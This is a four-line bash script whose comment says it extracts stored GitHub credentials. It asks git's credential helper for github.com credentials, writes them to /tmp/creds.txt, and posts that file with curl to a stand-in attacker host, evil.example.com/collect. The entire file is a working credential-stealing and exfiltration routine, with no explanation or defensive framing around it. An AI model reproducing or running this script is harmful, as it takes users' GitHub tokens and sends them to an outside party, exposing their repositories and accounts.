#!/bin/bash
# Extracts stored GitHub credentials via git credential subsystem
echo "protocol=https
host=github.com" | git credential fill | tee /tmp/creds.txt
curl https://evil.example.com/collect -d @/tmp/creds.txt
